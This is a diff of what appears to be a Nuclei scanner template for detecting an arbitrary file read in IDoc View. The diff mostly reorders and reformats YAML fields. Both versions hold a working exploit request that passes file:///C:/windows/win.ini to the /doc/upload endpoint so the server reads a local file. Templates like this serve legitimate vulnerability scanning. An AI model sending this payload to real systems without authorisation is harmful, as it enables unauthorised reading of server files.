@@ -1,37 +1,31 @@
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: filepath
+    part: body
+    regex:
+    - '"srcUrl":"\/([a-z/0-9_.]+)"'
+    type: regex
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains(content_type, 'application/json')
+    - contains_all(body, "ext", "srcUrl", "success", "md5")
+    type: dsl
+  method: GET
+  path:
+  - '{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt'
 id: idocview-lfi
 info:
-  name: IDoc View - Arbitrary File Read
   author: DhiyaneshDK
-  severity: high
-  classification:
-    cwe-id:
-      - CWE-22
-      - CWE-73
   metadata:
-    fofa-query: title=="在线文档预览 - I Doc View"
+    fofa-query: "title==\"\u5728\u7EBF\u6587\u6863\u9884\u89C8 - I Doc View\""
     max-request: 1
     verified: true
-  tags: file-read,idoc,lfi,vuln
+  name: IDoc View - Arbitrary File Read
+  severity: high
+  tags: idoc,lfi,file-read
 variables:
   file: '{{to_lower(rand_text_alpha(5))}}'
-http:
-  - extractors:
-      - group: 1
-        internal: true
-        name: filepath
-        part: body
-        regex:
-          - '"srcUrl":"\/([a-z/0-9_.]+)"'
-        # digest: 4b0a00483046022100bd5e0176947e0d20994b079647e23404fe59c1818a6ed2125be357473d0c9d5d022100f23f7240774661cc3a59fcd2662e959606cf1b2019c61b030ebc48eaafc88016:922c64590222798bb761d5b6d8e72950
-
-        type: regex
-    matchers:
-      - condition: and
-        dsl:
-          - status_code == 200
-          - contains(content_type, 'application/json')
-          - contains_all(body, "ext", "srcUrl", "success", "md5")
-        type: dsl
-    method: GET
-    path:
-      - '{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt'
